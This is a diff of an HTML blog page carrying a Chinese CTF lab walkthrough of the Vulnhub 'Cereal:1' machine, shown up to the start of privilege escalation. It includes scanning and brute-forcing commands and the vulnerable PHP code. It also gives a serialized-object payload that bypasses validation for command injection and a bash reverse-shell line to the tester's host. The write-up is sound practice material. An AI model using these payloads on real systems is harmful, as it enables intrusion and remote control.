@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://blog.kekwy.com/archives/2022/11/"/>
+  
+  <link rel="canonical" href="http://blog.kekwy.com/vulnhub-cereal/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,18 +33,26 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="铃的杂货铺" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>归档：2022/11 - 铃的杂货铺</title>
-  <meta name="keywords" content="null">
+  <title>【渗透测试】第十周 vulnhub-Cereal:1 - 铃的杂货铺</title>
+  <meta name="keywords" content="学习,Kali,网络,安全,Linux,vulnhub,null">
   <meta desc name="description" content="喜欢夏天的无名之辈 - 可弟WZ铃号机 - 铃的杂货铺">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="铃的杂货铺">
-<meta property="og:url" content="http://blog.kekwy.com/archives/2022/11/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【渗透测试】第十周 vulnhub-Cereal:1">
+<meta property="og:url" content="http://blog.kekwy.com/vulnhub-Cereal/index.html">
 <meta property="og:site_name" content="铃的杂货铺">
-<meta property="og:description" content="喜欢夏天的无名之辈">
+<meta property="og:description" content="网络攻防实战 第十次实验 邮箱：&amp;#107;&amp;#x65;&amp;#x65;&amp;#107;&amp;#x6b;&amp;#x65;&amp;#119;&amp;#121;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d; 2022年11月26日 靶机链接：https:&#x2F;&#x2F;vulnhub.com&#x2F;entry&#x2F;cereal-1,703&#x2F;  一、实验目的获取靶机 root 权限和一个 root flag。 我们将">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.kekwy.com/media/images/logo.png">
+<meta property="article:published_time" content="2022-11-26T07:59:32.000Z">
+<meta property="article:modified_time" content="2022-11-26T08:07:41.195Z">
 <meta property="article:author" content="可弟WZ铃号机">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://blog.kekwy.com/media/images/logo.png">
   <style>
@@ -2221,7 +2229,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2606,7 +2614,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="/media/images/cover.png"></div>
 
@@ -2698,27 +2706,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/vulnhub-Cereal/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="铃的杂货铺">
@@ -2728,287 +2716,479 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="喜欢夏天的无名之辈">
   </span>
   
-  
+
+
   
     <div class='headimg-div'>
-      <a class='headimg-a' href="/vulnhub-Cereal/">
-        <img itemprop="image" class='headimg' alt="【渗透测试】第十周 vulnhub-Cereal:1" src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
+      <a class='headimg-a'>
+        <img itemprop="image" class='headimg' src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
       </a>
     </div>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/vulnhub-Cereal/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         【渗透测试】第十周 vulnhub-Cereal:1
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="https://blog.kekwy.com" rel="nofollow">
+    <img itemprop="image" src="/media/images/avatar.jpg" class="lazyload" data-srcset="/media/images/avatar.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">可弟WZ</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
     
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
+      </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-26T15:59:32+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2022年11月26日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="lc-pv" data-title="【渗透测试】第十周 vulnhub-Cereal:1" data-path="/vulnhub-Cereal/">
+        <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
+      </span>
+      
+      <span>次浏览</span>
+    </p>
+  </a>
+</div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <blockquote>
+<p>网络攻防实战 第十次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#x65;&#x65;&#107;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#107;&#x65;&#x65;&#107;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>2022年11月26日</p>
+<p>靶机链接：<a target="_blank" rel="noopener" href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p>
+</blockquote>
+<div class="story post-story"><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机 root 权限和一个 root flag。</p>
+<p>我们将使用以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描；</li>
+<li>隐藏路径爆破；</li>
+<li>域名绑定 IP；</li>
+<li>隐藏域名爆破；</li>
+<li>隐藏文件爆破；</li>
+<li>解析 PHP 对象序列并进行命令注入；</li>
+<li>反弹 shell；</li>
+<li>利用 pspy 工具查看靶机上运行的所有进程；</li>
+<li>通过链接文件利用靶机漏洞；</li>
+<li>自定义 root 用户；</li>
+</ul>
+</div><div class="story post-story"><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.17</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br></pre></td></tr></table></figure>
+
+<img src="https://assets.kekwy.com/images/image-20221124223623886.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124223623886.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124223623886" style="zoom:150%;" />
+
+<p>发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。</p>
+</li>
+<li><p>访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息：</p>
+<img src="https://assets.kekwy.com/images/image-20221124224018467.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124224018467.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124224018467" style="zoom:150%;" />
+</li>
+<li><p>尝试进行隐藏路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17</span><br></pre></td></tr></table></figure>
+
+<img src="https://assets.kekwy.com/images/image-20221124224804390.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124224804390.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124224804390" style="zoom:150%;" />
+</li>
+<li><p>访问 <a target="_blank" rel="noopener" href="http://10.0.2.17/blog%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E6%A0%B7%E5%BC%8F%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%96%91%E4%BC%BC%E4%B8%8E%E6%9F%90%E4%B8%80%E5%9F%9F%E5%90%8D%E6%9C%89%E5%85%B3%EF%BC%9A">http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关：</a></p>
+<img src="https://assets.kekwy.com/images/image-20221124225803901.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124225803901.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124225803901" style="zoom:150%;" />
+
+<p>同时发现该网页是由 WordPress 支持的。</p>
+<ul>
+<li>技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。</li>
+</ul>
+</li>
+<li><p>对 &#x2F;blog 路径进行进一步的路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17/blog/</span><br></pre></td></tr></table></figure>
+
+<img src="https://assets.kekwy.com/images/image-20221124230403083.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124230403083.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124230403083" style="zoom:150%;" />
+
+<p>发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。</p>
+</li>
+<li><p>尝试在 hosts 文件中加入记录 <code>10.0.2.17 cereal.ctf</code> 将该域名与靶机的 IP 地址对应。</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts:</span><br><span class="line">...</span><br><span class="line">10.0.2.17 		cereal.ctf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重新访问 blog 页面，发现成功加载了样式：</p>
+<img src="https://assets.kekwy.com/images/image-20221124231004932.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221124231004932.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221124231004932" style="zoom:150%;" />
+</li>
+<li><p>在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。</p>
+</li>
+<li><p>尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口：</p>
+<img src="https://assets.kekwy.com/images/image-20221125121314821.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125121314821.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125121314821" style="zoom:150%;" />
+
+<p>直接访问发现只有一行文本内容。</p>
+</li>
+</ol>
+<h3 id="0x01-服务器域名爆破"><a href="#0x01-服务器域名爆破" class="headerlink" title="0x01. 服务器域名爆破"></a>0x01. 服务器域名爆破</h3><ol>
+<li><p>联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt</li>
+</ul>
+<img src="https://assets.kekwy.com/images/image-20221125154012372.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125154012372.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125154012372" style="zoom:150%;" />
+
+<p>成功扫描出一个域名：<code>secure.cereal.ctf</code></p>
+</li>
+<li><p>将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 <code>http://secure.cereal.ctf:44441/</code>：</p>
+<img src="https://assets.kekwy.com/images/image-20221125154405285.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125154405285.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125154405285" style="zoom:150%;" />
+</li>
+<li><p>发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162041920.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125162041920.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125162041920" style="zoom:150%;" />
+
+<p>发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。</p>
+</li>
+</ol>
+<h3 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02. 命令注入"></a>0x02. 命令注入</h3><ol>
+<li><p>尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162519586.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125162519586.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125162519586" style="zoom:150%;" />
+
+<p>发现请求体比较可疑。</p>
+</li>
+<li><p>在 burp suite 中选中请求体中 obj 字段的值，进行解码：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162824732.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125162824732.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125162824732" style="zoom:150%;" />
+
+
+
+
+
+<img src="https://assets.kekwy.com/images/image-20221125162901663.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125162901663.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125162901663" style="zoom:150%;" />
+
+<p>得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。</p>
+</li>
+<li><p>查看相关的网页源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">submit_form</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> object = <span class="title function_">serialize</span>(&#123;<span class="attr">ipAddress</span>: <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">ip</span>.<span class="property">value</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">		object = object.<span class="title function_">substr</span>(object.<span class="title function_">indexOf</span>(<span class="string">&quot;&#123;&quot;</span>),object.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">		object = <span class="string">&quot;O:8:\&quot;pingTest\&quot;:1:&quot;</span> + object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">obj</span>.<span class="property">value</span> = object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ipform&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。</p>
+<ul>
+<li><p>“We are in the process of restoring from our backups”</p>
+<img src="https://assets.kekwy.com/images/image-20221125171732769.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125171732769.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125171732769" style="zoom:150%;" /></li>
+</ul>
+</li>
+</ol>
+<h3 id="0x03-隐藏文件爆破"><a href="#0x03-隐藏文件爆破" class="headerlink" title="0x03. 隐藏文件爆破"></a>0x03. 隐藏文件爆破</h3><ol>
+<li><p>使用 kali 自带的 <code>DirBuster</code> 工具进行爆破：</p>
+<img src="https://assets.kekwy.com/images/image-20221125165830104.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125165830104.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125165830104" style="zoom:150%;" />
+
+<p>最终发现路径：<code>/back_en</code></p>
+</li>
+<li><p>继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 <code>.bak</code>：</p>
+<img src="https://assets.kekwy.com/images/image-20221126113550850.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126113550850.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126113550850" style="zoom:150%;" />
+
+<img src="https://assets.kekwy.com/images/image-20221126113421704.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126113421704.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126113421704" style="zoom:150%;" />
+
+<p>发现备份文件 <code>index.php.bak</code>。</p>
+</li>
+<li><p>将查找到的备份文件下载到 kali：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://secure.cereal.ctf:44441/back_en/index.php.bak</span><br></pre></td></tr></table></figure>
+
+<p>查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = False;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果当前对象中的 isValid 值不为 True</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 进行了某种过滤</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">                <span class="comment">// 测试通过才会执行代码</span></span><br><span class="line">				<span class="variable language_">$this</span>-&gt;isValid = True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ping</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 指令的执行方式</span></span><br><span class="line">			<span class="variable language_">$this</span>-&gt;output = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pingTest</span>-&gt;<span class="title function_ invoke__">validate</span>();</span><br></pre></td></tr></table></figure>
+
+<p>通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 <code>isValid</code> 值本身为 True，就可以绕过服务端对 <code>ipAddress</code> 字段合法性的检测，最终导致靶机执行我们所注入的命令。</p>
+</li>
+</ol>
+<h3 id="0x04-继续命令注入"><a href="#0x04-继续命令注入" class="headerlink" title="0x04. 继续命令注入"></a>0x04. 继续命令注入</h3><p><a id="task1"></a></p>
+<ol>
+<li><p>简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析：</p>
+<p><code>O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125;</code></p>
+<ul>
+<li>o：object，表示对象类型；</li>
+<li>8：表示其后的字符串长度为8；</li>
+<li>“pingTest”：表示当前对象为类 <code>pingTest</code> 的一个对象；</li>
+<li>1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性；</li>
+<li>s：string，表示字符串类型；</li>
+<li>9：其后的字符串长度；</li>
+<li>“ipAddress”：属性的名称；</li>
+<li>“127.0.0.1”：”ipAddress”属性的值；</li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31088019/article/details/126519989">PHP序列化和反序列化</a></p>
+</li>
+<li><p>可见请求体中发送给服务器的对象仅包含了 <code>ipAddress</code> 这个一个属性，为了绕过服务端的检测，需要添加 <code>isValid</code> 属性且将其赋值为 True。构造对象序列如下：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+<ul>
+<li>加入属性 <code>s:7:&quot;isValid&quot;;b:1;</code> 。</li>
+</ul>
+<p>其中，分析服务端代码得知，我们可以将需要注入的命令包含在 <code>ipAddress</code> 的值中，最终修改序列如下：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+</li>
+<li><p>在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送：</p>
+<img src="https://assets.kekwy.com/images/image-20221125211946453.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125211946453.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125211946453" style="zoom:150%;" />
+</li>
+<li><p>发现除了 ping 的结果，我们还收到了注入命令的执行结果：</p>
+<img src="https://assets.kekwy.com/images/image-20221125212053362.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125212053362.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125212053362" style="zoom:150%;" />
+</li>
+<li><p>尝试使用如下命令获取反弹 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>构造注入序列：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+<p>在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell：</p>
+<img src="https://assets.kekwy.com/images/image-20221125222124067.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221125222124067.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221125222124067" style="zoom:150%;" /></li>
+</ol>
+<h3 id="0x05-本地漏洞提权"><a href="#0x05-本地漏洞提权" class="headerlink" title="0x05. 本地漏洞提权"></a>0x05. 本地漏洞提权</h3><p><a id="task2"></a></p>
+<ol>
+<li><p>利用 <code>pspy</code> 工具检测靶机上正在运行的进程：</p>
+<img src="https://assets.kekwy.com/images/image-20221126105419392.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126105419392.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126105419392" style="zoom:150%;" />
+
+<p>发现存在一个以 root 身份运行某个 shell 脚本的进程。</p>
+<ul>
+<li>pspy 工具：<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li>
+</ul>
+</li>
+<li><p>查看该脚本内容;</p>
